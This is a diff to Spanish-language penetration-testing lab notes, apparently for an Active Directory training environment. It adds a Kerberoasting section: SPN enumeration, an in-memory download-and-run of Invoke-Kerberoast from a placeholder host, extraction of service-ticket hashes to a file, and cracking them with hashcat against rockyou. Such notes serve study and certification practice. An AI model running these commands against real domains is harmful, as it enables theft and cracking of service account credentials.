@@ -46,7 +46,33 @@ Paso 2:
 	serviceprincipalname     : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
 ```
 
-## Rubeus 
+## Forma 1: Kerberoast
+```powershell 
+# SPN (Service Principal Name) es el identificador único de un servicio en Kerberos — mapea un servicio a la cuenta que lo ejecuta. Por ejemplo MSSQLSvc/server.domain.local → cuenta svc_sql
+
+❯ setspn -T medin -Q */*
+```
+
+* [Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+```powershell  
+# Importar la herramienta sin tocar disco 
+❯ IEX (New-Object Net.WebClient).DownloadString('http://IP/Kerberoast.ps1')
+
+# Ejecutar el kerberoasting mostrando un hash en formato hashcat 
+❯ Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash
+
+❯ Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash | Out-File -NoNewline hashes.txt  
+# Guardarlo en un archivo 
+
+❯ Invoke-Kerberoast -OutputFormat hashcat |fl
+```
+
+```powershell 
+# Cracker el hash 
+❯ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+## Forma 2: Rubeus 
 
 Ten en cuenta que estamos usando la opción `/rc4opsec`, la cual obtiene hashes únicamente de cuentas que soportan RC4. Esto significa que si la opción "This account supports Kerberos AES 128/256 bit encryption" está habilitada para una cuenta de servicio, el siguiente comando no solicitará sus hashes.
 
